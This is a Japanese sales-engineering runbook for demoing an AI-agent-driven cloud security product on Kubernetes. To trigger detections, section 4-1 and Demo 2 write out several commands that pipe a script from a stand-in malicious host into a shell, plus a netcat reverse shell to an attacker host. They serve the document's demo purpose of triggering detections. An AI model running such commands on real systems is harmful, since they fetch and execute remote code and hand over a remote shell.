# Headless Sysdig 顧客向けデモ実施手順 (CSE向け Runbook)

## デモの目的

Headless Sysdig は、従来の「UIで操作するCNAPP」ではなく、

- AI Coding Agent
- MCP
- API
- CLI
- Chat Interface

を通じて、セキュリティ運用そのものを "Headless" に実行できる世界観を見せるデモです。

つまりデモの本質は:

> 「セキュリティ担当者がUIを開かずに、AI経由でクラウドセキュリティを運用する」

を体験してもらうことです。

---

## 1. 顧客に刺さるデモストーリー

特に日本企業では、単なる「AI連携」では弱いです。
以下のストーリーで持っていくと強いです。

### 推奨ストーリー

#### Before
- Alertが大量
- UIを何画面も開く
- CSPM / Vulnerability / Runtime が分断
- 調査が属人化
- Kubernetes調査に時間がかかる

↓

#### After (Headless)

AIに:

- 「この脆弱性の影響範囲を調べて」
- 「Runtime影響ある?」
- 「Fix方法出して」
- 「PR作って」
- 「実行中コンテナだけ優先して」
- 「curl|bash 系だけ抽出して」

と自然言語で依頼。

↓

AIが Sysdig API / Runtime Context / Graph を使って自律実行。

---

## 2. 一番ウケるデモ構成 (15〜20分)

| フェーズ | 内容 | 時間 |
|---------|------|------|
| Intro | なぜ UI-less Security が必要か | 2分 |
| Headless概要 | MCP / Agent / Skills | 2分 |
| Live Demo 1 | Vulnerability Investigation | 5分 |
| Live Demo 2 | Runtime Threat Investigation | 5分 |
| Live Demo 3 | Remediation生成 | 3分 |
| Closing | Runtime-first + AI-native | 2分 |

---

## 3. デモ前提環境

### 必須

#### Sysdig Secure
- Runtime enabled
- Vulnerability enabled
- CSPM enabled

#### Kubernetes環境
推奨:
- kind
- minikube
- EKS

最重要なのは:
- Runtime Event が出せる
- 脆弱コンテナがある

#### AI Agent
推奨:
- Cursor
- Claude Code
- VSCode + Agent
- OpenAI Codex系

#### MCP接続
Headless Sysdig の MCP endpoint を接続。

---

## 4. デモ前準備 (超重要)

### 4-1. Runtime Eventを仕込む

一番簡単。

```bash
kubectl exec -it nginx -- sh
curl http://malicious.example.com/run.sh | sh
```

または:

```bash
nc -e /bin/sh attacker.example.com 4444
```

Falco系 Runtime Event を事前生成。

### 4-2. 脆弱イメージを配置

推奨:
- old nginx
- vulnerable alpine
- intentionally vulnerable image

例:

```yaml
nginx:1.16
```

### 4-3. 調査対象を決める

事前に:
- namespace
- deployment
- container
- CVE

を固定しておく。
デモ中に探すと事故る。

---

## 5. デモシナリオ (実践版)

### Demo 1 — Vulnerability Investigation

#### 目的
「AIがRuntime Context込みで優先順位を判断できる」を見せる。

#### 実演

AI Agentに:

```
Show me critical vulnerabilities affecting running containers in production namespace.
```

#### 見せたいポイント

AIが:
- 実行中コンテナを優先
- CVSSだけでなくRuntime影響を見る
- Exposureを見る
- Reachabilityを見る

#### 追加

```
Which of these are internet exposed?
```

---

### Demo 2 — Runtime Threat Investigation

**ここが本命。Sysdig最大の差別化。**

#### Runtime Event 発生

例えば:

```bash
curl http://evil/payload.sh | sh
```

#### AIへ依頼

```
Investigate the latest runtime threat in production.
```

#### 見せたいポイント

AIが:
- Pod特定
- Process Tree分析
- Container Image特定
- Network通信
- Kubernetes Metadata
- User
- Timeline

を自動取得。

#### 超重要

ここで:

> **"This is why runtime matters."**

を入れる。Wiz系との差別化になる。

---

### Demo 3 — Remediation

#### AIに依頼

```
Generate remediation steps and create a patch suggestion.
```

#### 見せる内容

- Dockerfile修正
- Image upgrade
- Kubernetes YAML修正
- Policy recommendation

---

## 6. 日本企業向けに刺さる言い方

### 悪い例
「AIでセキュリティできます」 → 弱い。

### 良い例
- 「調査時間を10分→1分に短縮」
- 「Kubernetes専門家がいなくても調査できる」
- 「Runtime ContextをAIに渡せる」
- 「UIではなくWorkflowそのものをAI化」
- 「Security OperationsをAPI化」

---

## 7. デモ中に絶対言うべきこと

### 超重要メッセージ

「Headless = UIが不要になる、ではない」
ではなく:

> **「セキュリティ運用の主役が UI から AI Workflow に変わる」**

---

## 8. 顧客から高確率で来る質問

### Q. AIに全部任せるの?
**A.** Human-in-the-loop を前提。AIが Investigation を高速化する。

### Q. 誤検知は?
**A.** Runtime Context を使うことで、"実際に動いているか" を基準に優先順位付けできる。

### Q. APIだけでも出来たのでは?
**A.** Headless は単なる API ではなく、Sysdig Skills / Context / Workflow abstraction がポイント。

---

## 9. 一番強い締め

### クロージング

> **"Attackers already operate at machine speed.
> Security teams cannot continue operating at dashboard speed."**

↓

> **"Headless Sysdig moves security operations from dashboards to autonomous workflows."**

---

## 10. デモ成功のコツ (重要)

### やってはいけない
リアルタイムで全部やる → 事故る。

### 正解
「半仕込み」にする。

- Eventは事前生成
- 対象固定
- Namespace固定
- Image固定
- Query固定

---

## 11. 最終的な理想構成

### デモマシン
- Cursor
- VSCode
- Terminal
- Browser (最後だけ)

### 見せる比率

| 画面 | 割合 |
|------|------|
| AI Agent | 70% |
| Terminal | 20% |
| Sysdig UI | 10% |

これが "Headless感" を最も出せます。
